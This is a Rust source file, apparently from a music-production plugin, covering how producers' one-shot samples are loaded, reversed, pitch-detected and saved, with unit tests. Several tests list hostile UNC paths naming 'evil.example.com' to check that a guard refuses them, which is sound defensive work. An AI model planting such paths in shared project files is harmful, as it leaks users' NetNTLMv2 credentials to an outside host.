/// ⚠ **Its own seeded stream per lane**, so re-rolling one pad cannot move
/// another — the same rule every other domain in this codebase follows.
fn pick_for(lane: Lane, files: &[String], seed: u64) -> Option<String> {
    let candidates = crate::roles::candidates(lane, files);
    let at = engine::rng::index(seed, &format!("kit/randomize/{lane:?}"), candidates.len())?;
    candidates.get(at).map(|name| (*name).clone())
}

/// Decode a file into the thing a pad is built from.
///
/// ⛔ **Converted to the shipped kit's rate on the way in** (TASK-053). Every
/// voice reads its pad at `pad.sample_rate / device_rate`, so a producer's
/// 48 kHz sample sitting beside 44.1 kHz drums played at a *different* ratio
/// from everything around it — two resampling errors in one kit, both paid on
/// every note, both through the linear interpolator on the audio thread.
/// [`crate::audio::resample`] does it once here, band-limited, on this thread,
/// which is the loader thread the decode already runs on.
fn load(path: &Path, reversed: bool, lane: Lane) -> Result<OneShot, String> {
    let decoded = import::decode_file(path)?;
    let target = crate::audio::kit_rate();
    let mut samples =
        crate::audio::resample::to_rate(&decoded.samples, decoded.sample_rate, target);
    // ⛔⛔ **Backwards is baked into the buffer, not into playback** — Mike,
    // 2026-08-11: *"'Ctrl + left arrow' … should add the sample to that selected
    // drum pad lane in reverse."*
    //
    // ▶ **Reversing here rather than in the sampler is the cheap answer and the
    // safe one.** A `reversed` flag read per voice would put a branch and a
    // backwards read on the audio thread for every note of every lane, forever,
    // to serve a property that never changes after the file is loaded. Flipping
    // the `Vec` once, on the loader thread, costs nothing anybody can hear.
    //
    // ⚠ **A flat `reverse()` is correct because [`import::decode_file`] answers
    // in MONO** — its own doc says so, and `DecodedAudio` carries no channel
    // count. Interleaved stereo would need reversing by frame, and this line
    // would silently swap the channels instead.
    //
    // ⚠ **After the resample, not before.** Both orders sound the same, but
    // resampling reads a window either side of each output sample, so doing it
    // to an already-reversed buffer smears the attack backwards — an audible
    // difference on exactly the short percussive one-shots this is for.
    if reversed {
        samples.reverse();
    }

    // ⛔⛔ **What note this actually is, on the lanes where that means
    // anything** (TASK-052). Without it `Kit::with_one_shots` roots the sample
    // at whatever the *shipped* pad for that lane is rooted at — MIDI 84 on the
    // lead — so a violin sampled at C2 played two octaves out under the melody
    // it was dropped into.
    //
    // ⛔ **Asked only where `pitch::applies_to` allows, and that is a cost
    // decision as well as a correctness one.** A root on a kick would make the
    // drum grid's hand-drawn hits transpose it (that function's own doc), and
    // an NSDF over half a second is real work on a thread a kit re-roll runs a
    // dozen of.
    //
    // ⚠ **After the reverse, so it measures the buffer that will play.** A
    // reversed sample has the same fundamental, but this is the buffer the pad
    // holds and measuring the other one would be a reading of a sound nobody
    // will hear.
    let root = if crate::audio::pitch::applies_to(lane) {
        crate::audio::pitch::detect_root(&samples, target)
    } else {
        None
    };

    // ⛔⛔ **Where this sample can be held, if it can be** (TASK-053A). A
    // whole-note chord under a four-bar loop must sound for four bars, and
    // without this it stops when the file does — so the piano roll's note
    // lengths do nothing audible on a sustaining part.
    //
    // ⛔⛔ **`roles::is_melodic`, NOT `pitch::applies_to` — the two lists differ
    // by exactly one lane and it is the one that matters here.** The question a
    // loop answers is *"can a note on this lane be held"*, and that is the
    // question `sampler::hold_for` already asks, of `is_melodic`. `applies_to`
    // answers a different one — *"does this lane carry a root"* — and it
    // includes `Lane::Sub`, which `roles.rs` deliberately excludes from the
    // melodic list because an 808 *"has always rung past its note"* so its
    // slide can arrive. `hold_for(Sub, …)` is therefore `RINGS_OUT`, pinned by
    // its own test, and `trigger_with` discards a region on any voice that
    // rings out.
    //
    // ▶ Gating on `applies_to` meant every imported 808 paid a full-buffer
    // sustain walk on the loader thread for a region nothing could ever reach,
    // and `holds()` told the pad editor a Sub sample could be held when no note
    // on that lane is ever gated. `sampler.rs`'s own warning names this exact
    // drift: *"widening the gate — gating `Sub` … could land in one path and
    // not the other."*
    //
    // ⚠ **Not measured on a reversed buffer.** `Voice::reversed` mirrors the
    // read index rather than the buffer, and a loop *inside* a mirrored read is
    // a second thing for the render loop to reason about for a combination
    // nobody has asked for — a backwards pad is a gesture, not a sustain.
    let loop_region = if crate::roles::is_melodic(lane) && !reversed {
        crate::audio::sustain::find(&samples, target)
    } else {
        None
    };

    let decoded = crate::audio::kit::DecodedAudio {
        samples,
        sample_rate: target,
    };
    Ok(OneShot {
        reversed,
        root,
        loop_region,
        path: path.display().to_string(),
        // The file's own name. ⚠ `file_name` rather than `file_stem`: two
        // samples called `01` in different folders are common, and the
        // extension is often the only thing telling them apart on screen.
        name: file_name(path),
        samples: decoded.samples.into(),
        sample_rate: decoded.sample_rate,
    })
}

/// Change the assignment map, republish the kit built from it, and record the
/// paths in the project.
///
/// ⛔ **One function, because the three halves are a set.** A change that does
/// not republish is an assignment the producer made and cannot hear; a republish
/// that does not persist is one that vanishes when they reopen the project; and
/// a persist without the change writes down a sample nothing is playing. Every
/// caller goes through here so none can be forgotten — the same argument
/// `export::claim` makes about claiming and publishing.
fn apply(
    assigned: &Arc<Mutex<BTreeMap<Lane, OneShot>>>,
    missing: &Arc<Mutex<BTreeMap<Lane, String>>>,
    kits: &KitHandoff,
    session: &SessionStore,
    change: impl FnOnce(&mut BTreeMap<Lane, OneShot>),
) {
    let Ok(mut map) = assigned.lock() else {
        return;
    };
    change(&mut map);

    // ⛔ **The project is updated from the map, not from the change.** Writing
    // "the one that just landed" would leave the store describing the last
    // assignment rather than all of them, which reads correctly on the first
    // one and loses four of five on the fifth.
    //
    // ⛔ **…plus the paths that failed to load, or this write DELETES them.** A
    // failed reload never reaches `assigned`, so rewriting the map wholesale
    // dropped a moved sample's path from the project — and the next assignment
    // or clear persisted that loss, so putting the file back could not bring it
    // return. A lane the producer explicitly cleared is removed from both, so
    // "clear" still means clear.
    let stale = missing.lock().map(|held| held.clone()).unwrap_or_default();
    crate::state::update(session, |stored| {
        stored.one_shots = map
            .iter()
            .map(|(lane, one_shot)| (*lane, one_shot.path.clone()))
            .chain(
                stale
                    .iter()
                    .filter(|(lane, _)| !map.contains_key(lane))
                    .map(|(lane, path)| (*lane, path.clone())),
            )
            .collect();
        // ⛔ **Written from the same map, in the same pass, or a reversed pad
        // reloads forwards.** The buffer is already flipped, so the file on disk
        // cannot say which way it was assigned — this is the only record.
        //
        // ⚠ **Only the `true` ones**, so the map stays empty for the overwhelming
        // majority of projects and the field serializes away entirely. A lane
        // that was cleared drops out of `map` and therefore out of here, which is
        // what stops a stale `true` reversing a *different* sample assigned to
        // the same lane later.
        stored.one_shots_reversed = map
            .iter()
            .filter(|(_, one_shot)| one_shot.reversed)
            .map(|(lane, _)| (*lane, true))
            .collect();
    });

    // ⛔ The **model's** kit, not the shipped trap one. This is the path that
    // hands the audio thread what it plays, so resolving `preview_kit()` here
    // is what made every artist sound like trap however they were authored.
    // ⚠ Read in the same pass as the model, and *after* the write above, so a
    // rebuild triggered by a pad edit sees the edit it was triggered by.
    let (model_id, tweaks) =
        crate::state::with(session, |s| (s.selected_id.clone(), s.pad_tweaks.clone()))
            .unwrap_or_default();
    let Some(base) = crate::audio::kit_for_model(&model_id.unwrap_or_default()) else {
        // No kit at all means nothing to build over, and the plugin is already
        // silent for that reason — `preview_kit` logs it once.
        return;
    };
    // ⛔ Built here, on this thread, and handed over whole. The audio thread
    // never allocates and never sees a half-applied kit.
    // ⚠ Tweaks last — see `Kit::with_tweaks` for why the order is not free.
    kits.send(Arc::new(base.with_one_shots(&map).with_tweaks(&tweaks)));
}

#[cfg(test)]
mod tests {
    use super::*;
    // ⚠ Imported here rather than at the top of the file: since the base kit
    // became the *model's* (TASK-140/#23) nothing outside these tests resolves
    // the shipped trap kit directly, and a top-level import fails
    // `clippy -D warnings` on the lib build.
    use crate::audio::preview_kit;

    pub(super) fn one_shot(name: &str, level: f32) -> OneShot {
        OneShot {
            path: format!("C:/samples/{name}"),
            name: name.to_owned(),
            samples: Arc::from(vec![level; 64].into_boxed_slice()),
            sample_rate: 48_000,
            reversed: false,
            // A flat buffer has no pitch to find and no steady state a loop
            // could be spliced into, so these fixtures carry the answers
            // detection would give them anyway.
            root: None,
            loop_region: None,
        }
    }

    #[test]
    fn an_assigned_sample_replaces_what_the_lane_played() {
        let base = preview_kit().expect("the shipped kit must load");
        let assigned = BTreeMap::from([(Lane::Melody, one_shot("my-lead.wav", 0.5))]);
        let kit = base.with_one_shots(&assigned);

        let pad = &kit.pads[kit.pad_for(Lane::Melody).expect("melody must have a pad")];
        assert_eq!(pad.id, "my-lead.wav");
        assert_eq!(pad.sample_rate, 48_000);
        assert_eq!(pad.samples.len(), 64);

        // Everything else is untouched: the kit is rebuilt whole, so a bug here
        // would silently swap the drums as well.
        let kick = &kit.pads[kit.pad_for(Lane::Kick).unwrap()];
        let base_kick = &base.pads[base.pad_for(Lane::Kick).unwrap()];
        assert_eq!(kick.samples.len(), base_kick.samples.len());
    }

    #[test]
    fn a_one_shot_on_a_melodic_part_keeps_the_root_it_is_played_against() {
        // ⛔ **This is what makes it play in tune with the part rather than two
        // octaves out.** The lead pad is rooted at MIDI 84 because that is where
        // the melody generator writes, so a sample assigned there is transposed
        // by the *interval* the melody moves. Rooting it at a fixed C3 instead
        // would pitch it up two octaves under that same melody.
        let base = preview_kit().unwrap();
        let assigned = BTreeMap::from([
            (Lane::Melody, one_shot("lead.wav", 0.5)),
            (Lane::Bass, one_shot("sub.wav", 0.5)),
            (Lane::Kick, one_shot("kick.wav", 0.5)),
        ]);
        let kit = base.with_one_shots(&assigned);

        let root = |lane: Lane| kit.pads[kit.pad_for(lane).unwrap()].root_note;
        assert_eq!(
            root(Lane::Melody),
            base.pads[base.pad_for(Lane::Melody).unwrap()].root_note
        );
        assert_eq!(
            root(Lane::Bass),
            base.pads[base.pad_for(Lane::Bass).unwrap()].root_note
        );
        // ...and percussion still has none, so its notes play as sampled rather
        // than being transposed by whatever pitch the drum generator wrote.
        assert_eq!(root(Lane::Kick), None);
    }

    #[test]
    fn an_assigned_hat_still_chokes_the_other_hat() {
        // A choke group is a physical claim about the instrument, not about the
        // sample — swapping the closed hat for your own must not let the open
        // one ring through it.
        let base = preview_kit().unwrap();
        let assigned = BTreeMap::from([(Lane::ClosedHat, one_shot("my-hat.wav", 0.5))]);
        let kit = base.with_one_shots(&assigned);

        let group = |lane: Lane| kit.pads[kit.pad_for(lane).unwrap()].choke_group;
        assert!(group(Lane::ClosedHat).is_some());
        assert_eq!(group(Lane::ClosedHat), group(Lane::OpenHat));
    }

    #[test]
    fn a_lane_the_kit_does_not_cover_becomes_playable() {
        // Assigning a one-shot to a lane with **no base pad** is its own path:
        // there is nothing to inherit gain or a root note from, so both take
        // their defaults rather than the base pad's values.
        //
        // ⚠ The base kit has `Snap` removed rather than being assumed to lack
        // it. This test used to read "a lane the shipped kit never covered",
        // which was true until TASK-140 gave every lane a default — but the
        // behaviour being tested was never about the shipped kit. A user kit,
        // or a genre kit that omits a lane, reaches exactly this path.
        let mut base = preview_kit().unwrap().as_ref().clone();
        base.pads.retain(|pad| pad.lane != Lane::Snap);
        assert_eq!(base.pad_for(Lane::Snap), None, "the premise of this test");

        let assigned = BTreeMap::from([(Lane::Snap, one_shot("snap.wav", 0.5))]);
        let kit = base.with_one_shots(&assigned);

        let pad = &kit.pads[kit.pad_for(Lane::Snap).expect("snap must now play")];
        assert_eq!(pad.id, "snap.wav");
        assert_eq!(pad.gain, 1.0, "unity, with no base pad to inherit from");
        assert_eq!(pad.root_note, None, "percussion plays as sampled");
    }

    #[test]
    fn clearing_a_lane_puts_the_shipped_sound_back() {
        let base = preview_kit().unwrap();
        let mut assigned = BTreeMap::from([(Lane::Melody, one_shot("lead.wav", 0.5))]);
        let overridden = base.with_one_shots(&assigned);
        assigned.remove(&Lane::Melody);
        let restored = base.with_one_shots(&assigned);

        let len = |kit: &Kit| kit.pads[kit.pad_for(Lane::Melody).unwrap()].samples.len();
        assert_eq!(len(&overridden), 64);
        assert_eq!(
            len(&restored),
            len(base),
            "clearing must return the lane to the shipped voice"
        );
    }

    #[test]
    fn a_terminal_status_is_taken_once_and_running_is_not() {
        let one_shots = OneShots::default();
        *one_shots.status.lock().unwrap() = Status::Done {
            lane: Lane::Melody,
            name: "lead.wav".into(),
        };
        assert!(matches!(one_shots.take_status(), Status::Done { .. }));
        assert_eq!(one_shots.take_status(), Status::Idle);

        *one_shots.status.lock().unwrap() = Status::Running;
        assert_eq!(one_shots.take_status(), Status::Running);
        assert_eq!(
            one_shots.take_status(),
            Status::Running,
            "running is not an outcome"
        );
        *one_shots.status.lock().unwrap() = Status::Idle;
    }

    #[test]
    fn a_second_dialog_is_refused_rather_than_opened() {
        // Two native dialogs from one plugin is a window a producer cannot
        // explain, and "assign twice quickly" is not a thing anybody means.
        let one_shots = OneShots::default();
        let kits = Arc::new(KitHandoff::default());

        let first = one_shots.claim().expect("the slot starts free");
        let err = one_shots
            .assign(Lane::Melody, &kits, &SessionStore::default())
            .unwrap_err();
        assert!(err.contains("already"), "{err}");

        first.publish(Status::Cancelled);
        assert_eq!(one_shots.take_status(), Status::Cancelled);
    }

    #[test]
    fn cancelling_is_not_a_failure() {
        // Closing an Open dialog is the ordinary way out of it.
        let one_shots = OneShots::default();
        *one_shots.status.lock().unwrap() = Status::Cancelled;
        let taken = one_shots.take_status();
        assert_eq!(taken, Status::Cancelled);
        assert!(!matches!(taken, Status::Failed { .. }));
    }

    #[test]
    fn restoring_a_path_that_no_longer_exists_says_so_rather_than_going_quiet() {
        // ⛔ The project stores a path, so a moved or deleted sample is the
        // normal failure. Silently falling back to the shipped voice would be a
        // producer's kit changing under them with nothing to explain it.
        let one_shots = OneShots::default();
        let kits = Arc::new(KitHandoff::default());
        let session = SessionStore::default();
        let err = one_shots
            .restore(Lane::Melody, "./no-such-sample.wav", false, &kits, &session)
            .unwrap_err();
        assert!(err.contains("could not open"), "{err}");
        assert!(
            one_shots.snapshot().is_empty(),
            "a failed restore must not leave a phantom assignment"
        );
    }

    #[test]
    fn the_snapshot_carries_what_the_project_has_to_store() {
        let one_shots = OneShots::default();
        let kits = Arc::new(KitHandoff::default());
        let session = SessionStore::default();
        apply(
            &one_shots.assigned,
            &one_shots.missing,
            &kits,
            &session,
            |map| {
                map.insert(Lane::Melody, one_shot("lead.wav", 0.5));
            },
        );

        let snapshot = one_shots.snapshot();
        let (path, name) = snapshot.get(&Lane::Melody).expect("melody is assigned");
        assert_eq!(path, "C:/samples/lead.wav");
        assert_eq!(name, "lead.wav");
    }

    #[test]
    fn an_assignment_reaches_the_project_file_and_clearing_takes_it_back_out() {
        // ⛔ **The half `apply` exists to make unforgettable.** An assignment
        // that plays but is never written down is one the producer loses on the
        // next reopen, with the plugin having given them every reason to think
        // it was saved — the same class of failure as the arrangement that was
        // not persisted, three handoffs running.
        let one_shots = OneShots::default();
        let kits = Arc::new(KitHandoff::default());
        let session = SessionStore::default();

        apply(
            &one_shots.assigned,
            &one_shots.missing,
            &kits,
            &session,
            |map| {
                map.insert(Lane::Melody, one_shot("lead.wav", 0.5));
                map.insert(Lane::Kick, one_shot("my-kick.wav", 0.5));
            },
        );
        let stored = crate::state::read(&session).one_shots;
        assert_eq!(
            stored.get(&Lane::Melody).map(String::as_str),
            Some("C:/samples/lead.wav")
        );
        assert_eq!(stored.len(), 2, "every assignment, not just the last");

        apply(
            &one_shots.assigned,
            &one_shots.missing,
            &kits,
            &session,
            |map| {
                map.remove(&Lane::Melody);
            },
        );
        let stored = crate::state::read(&session).one_shots;
        assert_eq!(stored.len(), 1, "clearing must remove it from the project");
        assert!(stored.contains_key(&Lane::Kick), "and leave the others");
    }

    #[test]
    fn changing_the_assignment_republishes_the_kit() {
        // ⛔ The pair `apply` exists to keep together: a change nobody
        // republishes is an assignment the producer made and cannot hear.
        let one_shots = OneShots::default();
        let kits = Arc::new(KitHandoff::default());

        let mut current = preview_kit().cloned();
        assert!(
            !kits.receive(&mut current),
            "nothing has been handed over yet"
        );

        apply(
            &one_shots.assigned,
            &one_shots.missing,
            &kits,
            &SessionStore::default(),
            |map| {
                map.insert(Lane::Melody, one_shot("lead.wav", 0.5));
            },
        );
        assert!(kits.receive(&mut current), "the kit must have been sent");
        let kit = current.expect("a kit is now current");
        assert_eq!(kit.pads[kit.pad_for(Lane::Melody).unwrap()].id, "lead.wav");
    }
}

#[cfg(test)]
mod remote_path_tests {
    use super::*;

    #[test]
    fn a_project_file_cannot_make_the_plugin_authenticate_to_a_stranger() {
        // ⛔⛔ The security finding this guard exists for. `one_shots` rides in
        // the `#[persist]` blob, so it travels inside any shared project or
        // preset — and on Windows a UNC path is not a read, it is an outbound
        // SMB session that hands over NetNTLMv2 credentials.
        for hostile in [
            r"\\evil.example.com\share\kick.wav",
            r"\\evil.example.com@SSL@443\share\kick.wav",
            r"\\?\UNC\evil.example.com\share\kick.wav",
            r"\\.\pipe\anything",
            "//evil.example.com/share/kick.wav",
        ] {
            let error =
                refuse_remote(Path::new(hostile)).expect_err("a network path must be refused");
            assert!(error.contains("network path"), "{hostile}: {error}");
        }
    }

    #[test]
    fn an_ordinary_local_path_still_loads() {
        // ⚠ Including a mapped drive letter, which is how a producer with a
        // network sample library actually refers to it — refusing that would
        // break a legitimate setup to close a hole it is not part of.
        for fine in [
            r"C:\Users\mike\samples\kick.wav",
            r"Z:\shared-library\kick.wav",
            "/home/mike/samples/kick.wav",
            "samples/kick.wav",
        ] {
            assert!(refuse_remote(Path::new(fine)).is_ok(), "{fine} must load");
        }
    }

    /// ⛔⛔ **The File Explorer's own paths must not read as network paths.**
    ///
    /// `Path::canonicalize` on Windows answers `\\?\C:\…`, and `Explorer::open`
    /// canonicalises the folder it browses — so every row the page is given
    /// carries that prefix. Refusing it meant a producer could open a root, see
    /// its subfolders, and not enter a single one; the preview player, the
    /// waveform and the drag-to-pad drop were refused by the same line.
    ///
    /// ⚠ Windows-only, and that is the point rather than a portability dodge: on
    /// Linux this string has no path prefix, is not something `canonicalize`
    /// produces, and *should* still be refused as the portable-project payload
    /// the guard was written for.
    #[test]
    #[cfg(windows)]
    fn a_canonicalised_windows_path_is_local() {
        for fine in [
            r"\\?\C:\Users\mike\samples\kick.wav",
            r"\\?\C:\Users\mike\samples",
            r"\\?\Z:\shared-library\kick.wav",
        ] {
            assert!(
                refuse_remote(Path::new(fine)).is_ok(),
                "{fine} is a local drive and must load"
            );
        }

        // ...and the verbatim form of a UNC path is still refused, which is the
        // half that genuinely names a stranger's host.
        let error = refuse_remote(Path::new(r"\\?\UNC\evil.example.com\share\kick.wav"))
            .expect_err("a verbatim UNC path must still be refused");
        assert!(error.contains("network path"), "{error}");
    }

    #[test]
    fn the_guard_is_on_the_reopen_path_and_not_on_the_dialog() {
        // ⚠ `assign` comes from a native dialog the producer drove themselves,
        // so a network path chosen there is a choice rather than an injection.
        // `restore` is the one place a *file* gets to name a path.
        let one_shots = OneShots::default();
        let kits = Arc::new(KitHandoff::default());
        let error = one_shots
            .restore(
                Lane::Melody,
                r"\\evil.example.com\share\kick.wav",
                false,
                &kits,
                &SessionStore::default(),
            )
            .unwrap_err();
        assert!(error.contains("network path"), "{error}");
        assert!(one_shots.snapshot().is_empty(), "nothing may be recorded");
    }
}

#[cfg(test)]
mod missing_path_tests {
    use super::tests::one_shot;
    use super::*;

    #[test]
    fn a_sample_that_moved_is_still_named_in_the_project_after_the_next_edit() {
        // ⛔ **`apply` rewrites `one_shots` wholesale from `assigned`, and a
        // failed reload never reaches `assigned`** — so the next assignment or
        // clear wrote a map with that lane absent and the path was gone for
        // good. Putting the file back could not restore it. That contradicted
        // `restore_one_shots`'s own promise: "logged and skipped, not fatal …
        // the producer must still get their project back".
        let one_shots = OneShots::default();
        let kits = Arc::new(KitHandoff::default());
        let session = SessionStore::default();

        // Melody's sample has moved; the reload fails.
        assert!(one_shots
            .restore(Lane::Melody, "./no-such-sample.wav", false, &kits, &session)
            .is_err());

        // The producer then assigns something on a different lane.
        apply(
            &one_shots.assigned,
            &one_shots.missing,
            &kits,
            &session,
            |map| {
                map.insert(Lane::Kick, one_shot("my-kick.wav", 0.5));
            },
        );

        let stored = crate::state::read(&session).one_shots;
        assert_eq!(
            stored.get(&Lane::Melody).map(String::as_str),
            Some("./no-such-sample.wav"),
            "the moved sample's path must survive so putting the file back works"
        );
        assert!(stored.contains_key(&Lane::Kick));
    }

    #[test]
    fn clearing_a_lane_forgets_its_path_even_when_the_file_was_missing() {
        // Otherwise "clear" would leave the project still asking for the file on
        // the next open — the opposite of what the button says.
        let one_shots = OneShots::default();
        let kits = Arc::new(KitHandoff::default());
        let session = SessionStore::default();

        let _ = one_shots.restore(Lane::Melody, "./gone.wav", false, &kits, &session);
        one_shots.clear(Lane::Melody, &kits, &session);

        assert!(crate::state::read(&session).one_shots.is_empty());
    }

    /// ⛔⛔ **A reversed one-shot has to be written down or it reloads forwards.**
    ///
    /// Mike, 2026-08-11: *"'Ctrl + left arrow' … should add the sample to that
    /// selected drum pad lane **in reverse**."* The flip happens at decode time —
    /// `load` says why it belongs there and not on the audio thread — so the
    /// buffer is the only evidence it happened, and the buffer is not saved. The
    /// path alone reloads the file the way it is on disk.
    ///
    /// ⚠ **Asserted through `apply`**, which is the one function every
    /// assignment goes through, rather than through `restore` — a decode needs a
    /// real file and this is about the *record*, not the audio.
    #[test]
    fn a_reversed_one_shot_is_remembered_and_a_forward_one_is_not() {
        let assigned = Arc::new(Mutex::new(BTreeMap::new()));
        let missing = Arc::new(Mutex::new(BTreeMap::new()));
        let kits = KitHandoff::default();
        let session = SessionStore::default();

        let mut backwards = one_shot("reverse-crash.wav", 0.5);
        backwards.reversed = true;
        apply(&assigned, &missing, &kits, &session, |map| {
            map.insert(Lane::Crash, backwards);
            map.insert(Lane::Kick, one_shot("kick.wav", 0.5));
        });

        let stored = crate::state::read(&session);
        assert_eq!(
            stored.one_shots_reversed.get(&Lane::Crash),
            Some(&true),
            "the reversed crash reloads forwards"
        );
        // ⚠ **Absent, not `false`.** Only the reversed ones are written, so the
        // map stays empty for the overwhelming majority of projects and the field
        // serializes away entirely.
        assert_eq!(stored.one_shots_reversed.get(&Lane::Kick), None);
        assert_eq!(stored.one_shots.len(), 2, "both paths are still saved");
    }

    #[test]
    fn clearing_a_lane_stops_it_being_remembered_as_reversed() {
        // ⛔ Otherwise a stale `true` would reverse a *different* sample assigned
        // to the same lane later — a pad that plays backwards for no reason the
        // producer can see, having never asked for it.
        let assigned = Arc::new(Mutex::new(BTreeMap::new()));
        let missing = Arc::new(Mutex::new(BTreeMap::new()));
        let kits = KitHandoff::default();
        let session = SessionStore::default();

        let mut backwards = one_shot("reverse-crash.wav", 0.5);
        backwards.reversed = true;
        apply(&assigned, &missing, &kits, &session, |map| {
            map.insert(Lane::Crash, backwards);
        });
        apply(&assigned, &missing, &kits, &session, |map| {
            map.remove(&Lane::Crash);
        });

        assert!(crate::state::read(&session).one_shots_reversed.is_empty());
    }
    #[test]
    fn a_reroll_puts_a_snare_on_the_snare_lane_and_not_a_crash() {
        // ⛔ **The whole value of the dice is that what lands is plausibly the
        // thing the pad is for.** A pick that ignored the filenames would be a
        // novelty rather than a tool — and it would put a crash on the kick.
        let files: Vec<String> = [
            "C:/packs/kick 01.wav",
            "C:/packs/snare hard.wav",
            "C:/packs/crash.wav",
            "C:/packs/untitled-7.wav",
        ]
        .iter()
        .map(|s| (*s).to_owned())
        .collect();

        for seed in 1..40u64 {
            assert!(pick_for(Lane::Snare, &files, seed).is_some_and(|p| p.contains("snare")));
            assert!(pick_for(Lane::Kick, &files, seed).is_some_and(|p| p.contains("kick")));
        }
    }

    #[test]
    fn a_lane_with_nothing_to_put_on_it_is_answered_with_nothing() {
        // A folder of kicks should still re-roll the kick rather than refusing
        // the whole gesture, so a lane with no candidate answers None and the
        // caller skips it.
        let files = vec!["C:/packs/kick 01.wav".to_owned()];
        assert!(pick_for(Lane::Timbale, &files, 7).is_none());
        assert!(pick_for(Lane::Kick, &files, 7).is_some());
    }

    #[test]
    fn the_same_seed_rerolls_the_same_kit_and_a_different_one_does_not() {
        // Reproducible, like everything else that draws — and each lane on its
        // own stream, so re-rolling the hats cannot move the kick.
        let files: Vec<String> = (0..12)
            .map(|i| format!("C:/packs/snare {i:02}.wav"))
            .collect();

        assert_eq!(
            pick_for(Lane::Snare, &files, 7),
            pick_for(Lane::Snare, &files, 7)
        );
        let moved = (1..60u64)
            .any(|seed| pick_for(Lane::Snare, &files, seed) != pick_for(Lane::Snare, &files, 7));
        assert!(moved, "every seed picked the same file");
    }
}

/// The batch import (TASK-049), and the classifier's first caller (TASK-050).
///
/// ⚠ Its own module rather than sharing `missing_path_tests`: nothing here is
/// about a path that went missing, and a test file that groups by "where it
/// happened to be written" is the one nobody can find anything in.
#[cfg(test)]
mod batch_import_tests {
    use super::*;

    fn picked(names: &[&str]) -> Vec<std::path::PathBuf> {
        names
            .iter()
            .map(|name| std::path::PathBuf::from(format!("C:/packs/{name}")))
            .collect()
    }

    #[test]
    fn a_pack_lands_on_the_pads_its_filenames_name() {
        let (pairs, refused) = lanes_for(&picked(&[
            "Kick 01.wav",
            "SNARE_hard.wav",
            "closed hat.wav",
            "OpenHat 04.wav",
            "808_Cmaj.wav",
        ]));

        assert!(refused.is_empty(), "{refused:?}");
        let lanes: Vec<Lane> = pairs.iter().map(|(lane, _, _)| *lane).collect();
        assert_eq!(
            lanes,
            vec![
                Lane::Kick,
                Lane::Snare,
                Lane::ClosedHat,
                Lane::OpenHat,
                Lane::Sub
            ]
        );
    }

    #[test]
    fn a_name_the_classifier_cannot_place_is_refused_by_name_and_costs_the_batch_nothing() {
        // TASK-049's verify line in miniature: the batch never aborts, and the
        // file that did not land is named rather than counted.
        let (pairs, refused) = lanes_for(&picked(&["kick 01.wav", "untitled-7.wav", "snare.wav"]));

        assert_eq!(pairs.len(), 2, "the two placeable files still landed");
        assert_eq!(refused.len(), 1);
        assert_eq!(refused[0].name, "untitled-7.wav");
    }

    #[test]
    fn the_first_kick_wins_the_pad_and_the_rest_are_named_rather_than_overwriting_it() {
        // ⛔ The rule `add_many` exists to state: a pack ships `Kick 01`…`Kick
        // 08`, and the alternative to refusing the rest is a pad silently
        // holding whichever file the platform handed over last.
        let (pairs, refused) = lanes_for(&picked(&["Kick 01.wav", "Kick 02.wav", "Kick 03.wav"]));

        assert_eq!(pairs.len(), 1);
        assert!(pairs[0].1.ends_with("Kick 01.wav"), "{:?}", pairs[0].1);
        assert_eq!(refused.len(), 2);
        // ⚠ **Named by FILE, not by pad.** The producer can see which pads
        // filled; what they cannot see is which of their files lost, and a Rust
        // lane identifier in a panel translated into nineteen languages would
        // not have told them anyway.
        assert_eq!(
            refused.iter().map(|one| &*one.name).collect::<Vec<_>>(),
            vec!["Kick 02.wav", "Kick 03.wav"]
        );
    }

    #[test]
    fn a_remote_path_is_refused_by_name_rather_than_read() {
        // The UNC guard `refuse_remote` documents at length, reached through
        // the batch path — and reported rather than silently skipped, which is
        // what `load_many` used to do with it.
        let (loaded, refused) =
            decode_all(&[(Lane::Kick, r"\\evil.example.com\s\kick.wav".into(), false)]);

        assert!(loaded.is_empty());
        assert_eq!(refused.len(), 1);
        assert_eq!(refused[0].name, "kick.wav");
    }

    #[test]
    fn a_file_that_will_not_decode_is_one_refusal_and_not_a_stopped_batch() {
        let dir = std::env::temp_dir().join("freally-batch-import-test");
        std::fs::create_dir_all(&dir).expect("a temp dir");
        let bad = dir.join("snare 01.wav");
        std::fs::write(&bad, b"this is not a wav file").expect("write");

        let (loaded, refused) = decode_all(&[
            (Lane::Snare, bad.display().to_string(), false),
            (
                Lane::Kick,
                dir.join("kick 01.wav").display().to_string(),
                false,
            ),
        ]);

        assert!(loaded.is_empty());
        assert_eq!(
            refused.len(),
            2,
            "both files reported, neither aborted the other: {refused:?}"
        );
        assert_eq!(refused[0].name, "snare 01.wav");
        assert_eq!(refused[1].name, "kick 01.wav");

        let _ = std::fs::remove_file(&bad);
    }
}

/// Detecting what note a producer's sample is in (TASK-052).
///
/// ⛔ Its own module for the reason the batch import's is: this is about the
/// measurement feeding the kit, not about dialogs or missing paths.
#[cfg(test)]
mod detected_root_tests {
    use super::tests::one_shot;
    use super::*;
    use crate::audio::preview_kit;

    /// `seconds` of a sine at `hz`, at the kit's own rate.
    fn sine(hz: f32, seconds: f32) -> Vec<f32> {
        let rate = crate::audio::kit_rate() as f32;
        let n = (rate * seconds) as usize;
        (0..n)
            .map(|i| (2.0 * std::f32::consts::PI * hz * i as f32 / rate).sin())
            .collect()
    }

    fn tone(hz: f32) -> OneShot {
        let samples = sine(hz, 1.0);
        OneShot {
            path: "C:/samples/tone.wav".into(),
            name: "tone.wav".into(),
            root: crate::audio::pitch::detect_root(&samples, crate::audio::kit_rate()),
            loop_region: crate::audio::sustain::find(&samples, crate::audio::kit_rate()),
            samples: Arc::from(samples.into_boxed_slice()),
            sample_rate: crate::audio::kit_rate(),
            reversed: false,
        }
    }

    #[test]
    fn a_measured_root_beats_the_one_the_shipped_pad_would_have_lent_it() {
        // ⛔⛔ **The defect this task exists to fix.** The lead pad is rooted at
        // MIDI 84 because that is where the melody generator writes, so before
        // this a sample recorded at A2 (110 Hz, MIDI 45) was played as though it
        // were already a C6 — nearly four octaves out, with no control that
        // fixed it.
        let base = preview_kit().expect("the shipped kit must load");
        let lent = base.pads[base.pad_for(Lane::Melody).unwrap()].root_note;

        let assigned = BTreeMap::from([(Lane::Melody, tone(110.0))]);
        let kit = base.with_one_shots(&assigned);
        let measured = kit.pads[kit.pad_for(Lane::Melody).unwrap()].root_note;

        assert_eq!(measured, Some(45), "A2 is MIDI 45");
        assert_ne!(measured, lent, "the lent root is what this replaces");
    }

    #[test]
    fn a_sample_with_no_pitch_still_inherits_rather_than_losing_its_root() {
        // ⚠ **The fallback is the whole safety of the change.** A vocal chop or
